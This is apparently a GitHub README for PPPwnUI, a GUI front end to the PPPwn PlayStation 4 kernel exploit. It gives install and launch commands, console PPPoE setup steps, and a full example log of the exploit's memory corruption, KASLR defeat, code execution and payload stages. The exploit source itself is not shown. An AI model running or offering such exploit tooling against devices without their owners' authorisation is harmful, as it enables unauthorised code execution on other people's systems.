# PPPwnUI
PPPwnUI is a program that adds an UI to the exploit PPPwn created by TheFlow.

## Installation

- Clone the repository:

```git clone https://github.com/B-Dem/PPPwnUI```

- Install the requirements:

```pip install -r requirements.txt```

## Usage

- Launch the app with

```python PPPwnUI.py```

- Select your Interface using the drop-down menu

- Choose your Firmware (9.00 or 11.00)

- Click on **Start PPPwn** to start the Exploit


## PPPwn Usage

On your PS4:

- Go to `Settings` and then `Network`
- Select `Set Up Internet connection` and choose `Use a LAN Cable`
- Choose `Custom` setup and choose `PPPoE` for `IP Address Settings`
- Enter anything for `PPPoE User ID` and `PPPoE Pasword`
- Choose `Automatic` for `DNS Settings` and `MTU Settings`
- Choose `Do Not Use` for `Proxy Server`
- Click `Test Internet Connection` to communicate with your computer

If the exploit fails or the PS4 crashes, you can skip the internet setup and simply click on `Test Internet Connection`. If the script fail or is stuck waiting for a request/response, abort it and run it again on your computer, and then click on `Test Internet Connection` on your PS4.

### Example run

```sh
[+] PPPwn - PlayStation 4 PPPoE RCE by theflow
[+] args: interface=enp0s3 fw=1100 stage1=stage1/stage1.bin stage2=stage2/stage2.bin

[+] STAGE 0: Initialization
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 07:ba:be:34:d6:ab
[+] AC cookie length: 0x4e0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[*] Waiting for interface to be ready...
[+] Target IPv6: fe80::2d9:d1ff:febc:83e4
[+] Heap grooming...done

[+] STAGE 1: Memory corruption
[+] Pinning to CPU 0...done
[*] Sending malicious LCP configure request...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...
[+] Scanning for corrupted object...found fe80::0fdf:4141:4141:4141

[+] STAGE 2: KASLR defeat
[*] Defeating KASLR...
[+] pppoe_softc_list: 0xffffffff884de578
[+] kaslr_offset: 0x3ffc000

[+] STAGE 3: Remote code execution
[*] Sending LCP terminate request...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634beba00
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] Source MAC: 97:df:ea:86:ff:ff
[+] AC cookie length: 0x511
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Triggering code execution...
[*] Waiting for stage1 to resume...
[*] Sending PADT...
[*] Waiting for PADI...
[+] pppoe_softc: 0xffffabd634be9200
[+] Target MAC: xx:xx:xx:xx:xx:xx
[+] AC cookie length: 0x0
[*] Sending PADO...
[*] Waiting for PADR...
[*] Sending PADS...
[*] Waiting for LCP configure request...
[*] Sending LCP configure ACK...
[*] Sending LCP configure request...
[*] Waiting for LCP configure ACK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure NAK...
[*] Waiting for IPCP configure request...
[*] Sending IPCP configure ACK...
[*] Sending IPCP configure request...
[*] Waiting for IPCP configure ACK...

[+] STAGE 4: Arbitrary payload execution
[*] Sending stage2 payload...
[+] Done!
```

This Program was made with ❤️ by [Memz](https://github.com/B-Dem) for [Sighya](https://sighya.fr)

If you find this program helpful, leave a star on the repo !
